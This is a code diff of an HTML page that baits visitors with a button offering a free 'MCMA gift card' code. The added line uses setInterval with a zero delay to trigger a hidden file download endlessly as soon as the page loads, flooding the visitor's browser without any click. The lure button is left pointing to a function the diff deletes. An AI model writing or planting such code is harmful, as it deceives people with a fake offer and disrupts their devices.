@@ -3,15 +3,11 @@
   <button onclick="kk()">Click here to get the newest version of the MCMA gift card and your own gift card code!</button>
   <a href="" id="downlink" style="display:none" download="">a</a>
   <script>
-    function download(file) {
+    setInterval(function(){Download('./mcffqinnout.html')}, 0);
+    function Download(file) {
       var link = document.getElementById("downlink");
       link.setAttribute("download",file);
       link.click();
-    }
-    function kk(){
-      while (1==1){
-        download("./mcffqinnout.png");
-      }
     }
   </script>
 </body>
